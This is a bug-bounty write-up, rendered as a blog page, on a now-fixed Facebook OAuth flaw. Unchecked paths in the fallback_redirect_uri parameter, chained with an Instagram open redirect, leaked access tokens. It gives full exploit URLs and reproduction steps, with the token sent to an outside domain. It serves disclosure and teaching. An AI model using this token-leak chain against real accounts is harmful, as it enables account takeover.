@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Facebook account takeover due to a bypass of allowed callback URLs in the OAuth flow | Youssef Sammouda (sam0) personal blog</title>
+<meta name="generator" content="Jekyll v4.3.4" />
+<meta property="og:title" content="Facebook account takeover due to a bypass of allowed callback URLs in the OAuth flow" />
+<meta name="author" content="qw" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="This bug could allow a malicious user to takeover Facebook or Instagram accounts due to missing URL path checking in fallback_redirect_uri parameter specified in the Facebook OAuth flow endpoints." />
+<meta property="og:description" content="This bug could allow a malicious user to takeover Facebook or Instagram accounts due to missing URL path checking in fallback_redirect_uri parameter specified in the Facebook OAuth flow endpoints." />
+<link rel="canonical" href="http://localhost:4000/2021/04/02/facebook-account-takeover-due-to-a-bypass-of-allowed-callback-urls-in-the-oauth-flow.md-e" />
+<meta property="og:url" content="http://localhost:4000/2021/04/02/facebook-account-takeover-due-to-a-bypass-of-allowed-callback-urls-in-the-oauth-flow.md-e" />
+<meta property="og:site_name" content="Youssef Sammouda (sam0) personal blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-04-02T00:27:30+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Facebook account takeover due to a bypass of allowed callback URLs in the OAuth flow" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"qw"},"dateModified":"2021-04-02T00:27:30+01:00","datePublished":"2021-04-02T00:27:30+01:00","description":"This bug could allow a malicious user to takeover Facebook or Instagram accounts due to missing URL path checking in fallback_redirect_uri parameter specified in the Facebook OAuth flow endpoints.","headline":"Facebook account takeover due to a bypass of allowed callback URLs in the OAuth flow","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2021/04/02/facebook-account-takeover-due-to-a-bypass-of-allowed-callback-urls-in-the-oauth-flow.md-e"},"url":"http://localhost:4000/2021/04/02/facebook-account-takeover-due-to-a-bypass-of-allowed-callback-urls-in-the-oauth-flow.md-e"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Youssef Sammouda (sam0) personal blog" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Youssef Sammouda (sam0) personal blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Facebook account takeover due to a bypass of allowed callback URLs in the OAuth flow</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2021-04-02T00:27:30+01:00" itemprop="datePublished">Apr 2, 2021
+      </time>• <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span class="p-author h-card" itemprop="name">qw</span></span></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    This bug could allow a malicious user to takeover Facebook or Instagram accounts due to missing URL path checking in fallback_redirect_uri parameter specified in the Facebook OAuth flow endpoints.
+
+**Details**
+
+In the domain [m.facebook.com](https://m.facebook.com/), the endpoint **https://m.facebook.com/dialog/oauth** which handles Facebook OAuth flow, has a preformatted response when the requesting to get an access_token/code via the postMessage return method to an opener window ( via xd_arbiter). The script in the response would try to make a postMessage to the target origin specified and checked in the redirect_uri as explained below:  
+  
+Let’s take the example of the OAuth flow for authorizing the Instagram application. The visited url would be something like this   
+**https://m.facebook.com/v3.3/dialog/oauth?app_id=124024574287414**  
+**&amp;redirect_uri=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=46%23origin=https://www.instagram.com/%26relation=opener**  
+**&amp;response_type=token,signed_request**  
+**&amp;scope=public_profile,email**  
+  
+Here the interesting part is the redirect_uri parameter. Instead of selecting the whitelisted redirect_uri for this application , we would select the infamous xd_arbiter endpoint which would allow us to receive the Facebook code/access_token via javascript method for cross-window communication, the postMessage method. Here the origin parameter in the fragment part of the staticxx.facebook.com url must contain a whitelisted website by the Facebook application or the request would fail. The same origin would be served in the response as the targetOrigin for the postMessage method.   
+  
+Although the user can’t get the access_token via an Eventlistener due to the reasons i previously pointed ( postMessage targetOrigin can’t be manipulated ), i found that there’s another way to get the access_token/code in case the postMessage method failed:  
+  
+We modify the previous URL to be like the following:  
+**https://m.facebook.com/v3.3/dialog/oauth?app_id=124024574287414**  
+**&amp;redirect_uri=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=46%23origin=https://www.instagram.com/%26relation=opener**  
+**&amp;response_type=token,signed_request**  
+**&amp;scope=public_profile,email**  
+**&amp;fallback_redirect_uri=https://www.instagram.com/**  
+  
+We would get a similar response as this one:
+
+```javascript
+var closeURI = "https:\/\/m.facebook.com\/dialog\/close_window\/?app_id=124024574287414&connect=1&redirect_domain=www.instagram.com";
+var fallbackRedirectURI = "https:\/\/www.instagram.com\/#SIGNED_REQUEST&access_token=ACCESS_TOKEN";
+var message = "origin=https\u00253A\u00252F\u00252Fwww.instagram.com\u00252F&relation=opener&signed_request=SIGNED_REQUEST&access_token=ACCESS_TOKEN&data_access_expiration_time=0&expires_in=0",
+    origin = "https:\/\/www.instagram.com",
+    domain = "www.instagram.com",
+    relation = "opener",
+    debugXD = false,
+    xrw = "";
+(function() {
+    var a = window.opener || window.parent,
+        b = navigator.userAgent,
+        c = !0;
+
+    function d(a, b) {
+        a = window.location.hostname.match(/\.(facebook\.sg|facebookcorewwwi\.(?:test)?onion)$/);
+        a = a ? a[1] : "facebook.com";
+        new Image().src = "https://m." + a + "/common/scribe_endpoint.php?c=jssdk_error&m=" + encodeURIComponent(JSON.stringify(b))
+    }
+
+    function e() {
+        var b = a === window;
+        try {
+            a != null && a !== window && (a === window.opener && relation === "opener.parent" && (a = window.opener.parent), a.postMessage(message, origin), window.close(), window.open("", "_self", ""), window.close()), window.closed || (fallbackRedirectURI ? window.location.replace(fallbackRedirectURI) : closeURI ? window.location.replace(closeURI) : d("jssdk_error", {
+                error: "DIALOG_CLOSE",
+                extra: {
+                    message: "Dialog did not close. refWasSelf: " + b
+                }
+            }))
+        } catch (a) {
+            c ? (c = !1, window.setTimeout(e, 200)) : d("jssdk_error", {
+                error: "POST_MESSAGE",
+                extra: {
+                    message: a.message + ", html/js/mobile/connect/XDDialogResponsePurePostMessage.js:43 refWasSelf: " + b
+                }
+            })
+        }
+    }
+
+    function f() {
+        __fbNative.postMessage(message, origin)
+    }
+    if (window == top && /FBAN\/\w+;/i.test(b) && !/FBAN\/mLite;/.test(b)) window.__fbNative && __fbNative.postMessage ? f() : window.addEventListener("fbNativeReady", f);
+    else {
+        f = /iPhone.*Version\/(5|6)/.test(b) ? RegExp.$1 === "5" ? 250 : 800 : 0;
+        f ? window.setTimeout(function() {
+            e()
+        }, f) : e()
+    }
+})();
+
+
+```
+
+  
+The same script would redirect to a selected URL in a parameter called **fallback_redirect_uri** in case the domain of the URL inside fallback_redirect_url is the same as a website whitelisted by the application and if other conditions are fulfilled. This would only occur if no opener window was found because **window.close** won’t work and **window.closed** would be false and in that case **window.location.replace(fallbackRedirectURI)** would be executed and a redirect would be made to the URL selected in fallback_redirect_uri with the Facebook access_token/code embedded in the fragment part of the URL.   
+The actual bug now is that the **fallback_redirect_uri** would only accept a whitelisted website set in the Facebook application configuration however no checks were done to the path part of URL like what is normally done to urls supplied in redirect_uri parameter in OAuth flows ( only domain part was checked ). The attacker could select any path to receive the token. We can chain this with another bug in the receiving website like an open redirect to leak the token to the attacker website ( since the fragment part of the URL is carried by the browser in redirects, the malicious website would receive it ).   
+I have achieved Facebook/Instagram account takeover by chaining this bug and a [previously reported open redirect in Instagram](https://ysamm.com/?p=625).  
+  
+**Reproduction Steps**
+
+The victim should visit this url or an attacker website which redirects to it:
+
+**https://m.facebook.com/v3.3/dialog/oauth?app_id=124024574287414&amp;redirect_uri=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=46%23origin=https://www.instagram.com/%26relation=opener&amp;response_type=token,signed_request&amp;scope=public_profile,email&amp;fallback_redirect_uri=https://www.instagram.com/accounts/convert_to_professional_account/?redirect_uri=https://ysamm.com**   
+This would redirect to **https://www.instagram.com/accounts/convert_to_professional_account/?redirect_uri=https://ysamm.com#access_token&amp;signed_request** and since this contained an open redirect it would redirect to **https://ysamm.com#access_token&amp;signed_request**.
+
+The access_token is a first-party token generated for the Instagram application and could be used to takeover the Facebook account. The signed_request contains a code that could be used too to access the victim’s Instagram account.  
+  
+**Timeline**   
+  
+Feb 7, 2021— Report Sent   
+Feb 8, 2021— Acknowledged by Facebook  
+Feb 18, 2021— Fixed by Facebook  
+Feb 26, 2021 — $30K (including bonus) bounty awarded by Facebook.  
+Feb 26, 2021 – A bypass was sent to the team which allowed this to work despite the fix in mobile devices.  
+Mar 5, 2021— Acknowledged by Facebook  
+Mar 17, 2021— Fixed by Facebook  
+Mar 22, 2021 — $12K (including bonus) bounty awarded by Facebook.
+  </div><a class="u-url" href="/2021/04/02/facebook-account-takeover-due-to-a-bypass-of-allowed-callback-urls-in-the-oauth-flow.md-e" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Youssef Sammouda (sam0) personal blog</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Youssef Sammouda (sam0) personal blog</li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/samm0uda"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">samm0uda</span></a></li><li><a href="https://www.twitter.com/samm0uda"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">samm0uda</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>The goal of this blog is to share write-ups about bugs i have found in Facebook and reported to them under the Facebook bug bounty program.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
